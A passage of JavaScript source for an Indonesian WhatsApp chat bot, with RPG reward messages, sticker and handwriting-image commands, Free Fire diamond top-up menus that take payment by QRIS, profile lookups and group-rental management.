var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗚𝗼𝗯𝗹𝗶𝗻\n\n🎁 Hadiah Membunuh Goblin\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imggoblin }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
async function sendButdevil(from) {
ez = Math.ceil(Math.random() * 600)
addLevelingXp(sender, ez)
a = randomNomor(70)
b = randomNomor(600)
c = randomNomor(95)
d = randomNomor(6)
addLevelingXp(sender, ez)
addBalance(sender, b, balance)
addEmas(sender, a)
addBesi(sender, c)
addDm(sender, d)
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗗𝗲𝘃𝗶𝗹️\n\n🎁 Hadiah Membunuh Devil\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdevil }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
async function sendButbehemoth(from) {
ez = Math.ceil(Math.random() * 700)
addLevelingXp(sender, ez)
a = randomNomor(75)
b = randomNomor(600)
c = randomNomor(100)
d = randomNomor(7)
addLevelingXp(sender, ez)
addBalance(sender, b, balance)
addEmas(sender, a)
addBesi(sender, c)
addDm(sender, d)
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗕𝗲𝗵𝗲𝗺𝗼𝘁𝗵️\n\n🎁 Hadiah Membunuh Behemoth\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgbehemoth }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
async function sendButdemon(from) {
ez = Math.ceil(Math.random() * 850)
addLevelingXp(sender, ez)
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
addLevelingXp(sender, ez)
addBalance(sender, b, balance)
addEmas(sender, a)
addBesi(sender, c)
addDm(sender, d)
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗗𝗲𝗺𝗼𝗻️\n\n🎁 Hadiah Membunuh Demond\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdemon }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
async function sendButdemonking(from) {
ez = Math.ceil(Math.random() * 1000)
addLevelingXp(sender, ez)
addLevelingXp(sender, ez)
addBalance(sender, 1999, balance)
addEmas(sender, 99)
addBesi(sender, 99)
addDm(sender, 99)
var button = [
		{ urlButton: { displayText: `Script`, url : `${wame}` } },
		{ quickReplyButton: { displayText: `Inventori`, id: `${prefix}inventori` } },
		{ quickReplyButton: { displayText: `Owner`, id: `${prefix}owner` } }
		]
var hg = `☠️ 𝗠𝗶𝘀𝗶 𝗠𝗲𝗺𝗯𝘂𝗻𝘂𝗵 𝗗𝗲𝗺𝗼𝗻𝗞𝗶𝗻𝗴\n\n🎁 Hadiah Membunuh DemonKing\n • Uang : $${b}\n • Besi : ${c}\n • Emas : ${a}\n • Diamond : ${d}\n\nTerimakasih Telah Menjalankan Misi Ini>_<`
kirbotz.sendMessage(from, { caption: hg, location: { jpegThumbnail: imgdemonking }, templateButtons: button, footer: `Rpg Game By KirBotz`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
async function replyTemplate(teks) {
                       const buttonsDefault = [
	             		{ urlButton: { displayText: `WA OWNER`, url : `${wame}` } },
	             		{ quickReplyButton: { displayText: `RULES`, id : 'rules'}}
                                        	  ]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "Bot By BloodSword", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return kirbotz.sendMessage(from, buttonMessage)
                }

async function replyOwnerr(teks) {
                       const buttonsDefault = [
	             		{ urlButton: { displayText: `YouTube`, url : `${yt}` } }
                                        	  ]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "Bot By BloodSword", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return kirbotz.sendMessage(from, buttonMessage)
                }

async function replyNya(teks) {
                       const buttonsDefault = []                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "© BOT WHATSAPP 2022", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return kirbotz.sendMessage(from, buttonMessage)
                }

async function replyBan(teks) {
                       const buttonsDefault = [{ urlButton: { displayText: `MyOwner`, url : `${wame}` } }]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "© BOT WHATSAPP 2022", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return kirbotz.sendMessage(from, buttonMessage)
                }

async function replyPremium(teks) {
                       const buttonsDefault = [
	             		{ urlButton: { displayText: `MyOwner`, url : `${wame}` } },
	             		{ quickReplyButton: { displayText : `Buy Premium`, id : `buypremium` } }
                                        	  ]                 
                       const buttonMessage = { 
                                    text: teks, 
                                    footer: "Bot By BloodSword", 
                                    templateButtons: buttonsDefault, 
                                    image: {url: thumb}                                   
                                               }
                       return kirbotz.sendMessage(from, buttonMessage)
                }
                
async function sendBut5nya(teks) {
var button = [
{"urlButton": {"displayText": "MyOwner🔥","url": `https://wa.me/62881036690566`}},
{"quickReplyButton": {"displayText": "Sewabot","id": 'sewabot'}},
{"quickReplyButton": {"displayText": "Donasi","id": 'donasi'}},
{"quickReplyButton": {"displayText": "Status Bot BloodSword","id": 'ping'}}
		]
kirbotz.sendMessage(from, { caption: teks, location: { jpegThumbnail: thumb }, templateButtons: button, footer: `Owner Bot : ${owner.length}`, mentions: [sender] })
        .catch ((err) => reply(err))
        }
        
if (m.isGroup && isAutoSticker) {
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kirbotz.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyNya('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kirbotz.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

switch (command) {
case 'creategc': {
if (!isCreator) return reply(mess.owner)
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args.join(" ")) return reply(`Penggunaan ${prefix+command} namagroup`)
try {
let cret = await kirbotz.groupCreate(args.join(" "), [])
let response = await kirbotz.groupInviteCode(cret.id)
teks = `     「 Group Create Fitur 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB

https://chat.whatsapp.com/${response}
       `
kirbotz.sendMessage(m.chat, { text:teks, mentions: await kirbotz.parseMention(teks)}, {quoted:m})
} catch {
reply("Error!")
}
}
break
case 'getcase': {
if (!isCreator) return reply(mess.owner)
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return reply("Mau ngambil case apa?")
try {
reply(`// Created By BloodSword\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./kirbotz.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
} catch {
reply("Case Tidak Ditemukan")
}
}
break
case 'readmore':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
var more = String.fromCharCode(8206)
                var readMore = more.repeat(4001)
                const rmoreteks1 = q.split('|')[0] ? q.split('|')[0] : q
                const rmoreteks2 = q.split('|')[1] ? q.split('|')[1] : ''
                reply(`${rmoreteks1}${readMore}${rmoreteks2}`)
                break
case 'nulis':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!q) return reply(`Teks Nya Apa Kak?`)
let fejfjej = [
{
"title": `NULIS BUKU`,
 rows: [
{
"title": `KANAN`,
"rowId": `${prefix}nuliskanan ${q}`
}
,
{
"title": `KIRI`,
"rowId": `${prefix}nuliskiri ${q}`
}
]
}
,
{
"title": `NULIS FOLIO`,
 rows: [
{
"title": `KANAN`,
"rowId": `${prefix}foliokanan ${q}`
}
,
{
"title": `KIRI`,
"rowId": `${prefix}foliokiri ${q}`
}
]
}
]
kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Fitur Nulis By KirBotz ", fejfjej, { quoted: m })
break
case 'nuliskiri':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length < 1) return replyNya(`Kirim perintah *${prefix}nuliskiri* teks`)
replyNya(mess.wait)
var tulisan = body.slice(11)
var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
spawn('convert', ['./Kir/FOTO/BUKU/sebelumkiri.jpg','-font','./Kir/FONT/Indie-Flower.ttf','-size','960x1280','-pointsize','22','-interline-spacing','2','-annotate','+140+153',fixHeight,'./Kir/FOTO/BUKU/setelahkiri.jpg'])
.on('error', () => reply('error'))
.on('exit', () => {
kirbotz.sendMessage(from, { image: fs.readFileSync('./Kir/FOTO/BUKU/setelahkiri.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
})
}
break
case 'nuliskanan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (args.length < 1) return replyNya(`Kirim perintah *${prefix}nuliskanan* teks`)
replyNya(mess.wait)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', ['./Kir/FOTO/BUKU/sebelumkanan.jpg','-font','./Kir/FONT/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','2','-annotate','+128+129',fixHeight,'./Kir/FOTO/BUKU/setelahkanan.jpg'])
                .on('error', () => reply('error'))
                .on('exit', () => {
                kirbotz.sendMessage(from, { image: fs.readFileSync('./Kir/FOTO/BUKU/setelahkanan.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
                })
            }
                break
case 'foliokiri':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (args.length < 1) return replyNya(`Kirim perintah *${prefix}foliokiri* teks`)
replyNya(mess.wait)
                var tulisan = body.slice(11)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./Kir/FOTO/FOLIO/sebelumkiri.jpg','-font','./Kir/FONT/Indie-Flower.ttf','-size','1720x1280','-pointsize','23','-interline-spacing','4','-annotate','+48+185',fixHeight,'./Kir/FOTO/FOLIO/setelahkiri.jpg'])
                .on('error', () => reply('error'))
                .on('exit', () => {
                kirbotz.sendMessage(from, { image: fs.readFileSync('./Kir/FOTO/FOLIO/setelahkiri.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
                })
            }
                break
case 'foliokanan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (args.length < 1) return replyNya(`Kirim perintah *${prefix}foliokanan* teks`)
replyNya(mess.wait)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./Kir/FOTO/FOLIO/sebelumkanan.jpg','-font','./Kir/FONT/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','3','-annotate','+89+190',fixHeight,'./Kir/FOTO/FOLIO/setelahkanan.jpg'])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                kirbotz.sendMessage(from, { image: fs.readFileSync('./Kir/FOTO/FOLIO/setelahkanan.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtu.be/b0CCKgVEhlk',
"sourceUrl": 'https://kirbotz-api.herokuapp.com'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
                })
            }
                break
case 'topupff':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
var Yy = 0
let secmmknya = [
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `5 💎`,
"rowId": `${prefix}topup5 ${txt1}`
}
]
}
,
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `12 💎`,
"rowId": `${prefix}topup12 ${txt1}`
}
]
}
,
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `50 💎`,
"rowId": `${prefix}topup50 ${txt1}`
}
]
}
,
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `70 💎`,
"rowId": `${prefix}topup70 ${txt1}`
}
]
}
,
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `140 💎`,
"rowId": `${prefix}topup140 ${txt1}`
}
]
}
,
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `355 💎`,
"rowId": `${prefix}topup355 ${txt1}`
}
]
}
,
{
"title": `LIST KE ${Yy+=1}`,
 rows: [
{
"title": `720 💎`,
"rowId": `${prefix}topup720 ${txt1}`
}
]
}
]
kirbotz.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Topup Game By KirBotz ", secmmknya, { quoted: efff })
break
case 'topup5':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 5 💎
HARGA : 2.000
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'topup12':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 12 💎
HARGA : 3.000
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'topup50':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 50 💎
HARGA : 8.500
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'topup70':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 70 💎
HARGA : 11.000
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'topup140':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 140 💎
HARGA : 21.000
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'topup355':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 355 💎
HARGA : 54.500
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'topup720':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
txt1 = args[0]
let dede = await caliph.search.freefireid(`${txt1}`)
donte = `
ID : ${txt1}
USERNAME : ${dede.result}
JUMLAH : 720 💎
HARGA : 115.000
_SCAN QRIS DI ATAS ISI SESUAI NOMINAL_`
let message = await prepareWAMessageMedia({ image: fs.readFileSync('./Image/gopaykir.jpg') }, { upload: kirbotz.waUploadToServer })
const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
templateMessage: {
hydratedTemplate: {
imageMessage: message.imageMessage,
hydratedContentText: donte,
hydratedFooterText: `Jika Sudah Bayar Sesuai Nominal Silahkan Chat Nomor Owner Di Bawah Untuk Mengkonfirmasikan Bahwa Data Nya Benar Atau Salah.`,
hydratedButtons: [
{
urlButton: {
displayText: 'Owner Bot',
url: 'https://wa.me/62881036690566'
}
}]
}
}
}), { userJid: m.chat, quoted: m })
kirbotz.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'ffstalk': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!args[0]) return replyNya(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return replyNya("Hanya angka")
let dede = await caliph.search.freefireid(args.join(" "))
teks = `Message : ${dede.message}\nId : ${encodeURI(q)}\nResult : ${dede.result}`
reply(teks)
}
break
case 'profile': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
const jidny = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender ? m.sender : false
const ddny = await store.chats.all().filter(v => v.id.includes(jidny)).map(v => v)
const isblocks = await kirbotz.fetchBlocklist()
const isBlock = isblocks.includes(jidny)
texnr = `     「 Profile Inspector 」
▸ Number : ${jidny.split("@")[0]}
▸ Mention : @${jidny.split("@")[0]}
▸ Name : ${kirbotz.getName(jidny)}
▸ Biography : ${jsonformat(await kirbotz.fetchStatus(jidny).catch(() => {}))}
▸ Business : ${jsonformat(await kirbotz.getBusinessProfile(jidny))}
▸ LastChat : ${ddny[0] ? moment(ddny[0].conversationTimestamp * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss") : "undefined"}
▸ Chat : ${ddny[0] ? ddny[0].unreadCount +" chat" : "0 chat"}
▸ Blockir : ${isBlock}`
try {
ppuser = await kirbotz.profilePictureUrl(jidny, 'image')
} catch {
ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
kirbotz.sendMessage(m.chat, { image: { url: ppuser }, caption: texnr, mentions: await kirbotz.parseMention(texnr), contextInfo:{externalAdReply:{
title:"WhatsApp Bot Multi Device",
body:"By KirBotz",
thumbnail: ppnyauser,
mediaType:2,
mediaUrl: "https://youtu.be/b0CCKgVEhlk",
sourceUrl: "https://youtu.be/b0CCKgVEhlk"
}}}, {quoted:m})
}
break
case 'zippysearch':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    reply(mess.wait)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/zippyshare?apikey=${lolkey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_txt = `File Name : ${ini_url.name_file}\n`
                    ini_txt += `Size : ${ini_url.size}\n`
                    ini_txt += `Date Upload : ${ini_url.date_upload}\n`
                    ini_txt += `Download Url : ${ini_url.download_url}`
                    replyNya(ini_txt)
                    break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!text) return replyNya(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (text.includes('|')) return replyNya(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return replyNya(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
replyNya(mess.wait)
arg = args.join(' ')
mee = await kirbotz.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./Lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await kirbotz.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break
case 'sewa':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
if (!m.isGroup) return replyNya(mess.group)
if (!q) return replyNya(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
if (args[0].toLowerCase() === 'add'){
_sewa.addSewaGroup(from, args[1], sewa)
replyNya(mess.success)
} else if (args[0].toLowerCase() === 'del'){
sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
fs.writeFileSync('./Database/sewa.json', JSON.stringify(sewa))
replyNya(mess.success)
} else {
replyNya(`Penggunaan :\n*${prefix}sewa* add/del waktu`)}
break
case 'listsewa':
if (!m.isGroup) return replyNya(mess.group)
let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvippsewa = ms(i.expired - Date.now())
txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvippsewa.days} day(s) ${cekvippsewa.hours} hour(s) ${cekvippsewa.minutes} minute(s) ${cekvippsewa.seconds} second(s)\n\n`
}
replyNya(txtnyee)
break
case 'ceksewa': 
if (!m.isGroup) return replyNya(mess.group)
if (!isSewa) return replyNya(`Group Ini Tidak Terdaftar Dalam List Sewabot. Ketik ${prefix}sewabot Untuk Info Lebih Lanjut`)
let cekvipsewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
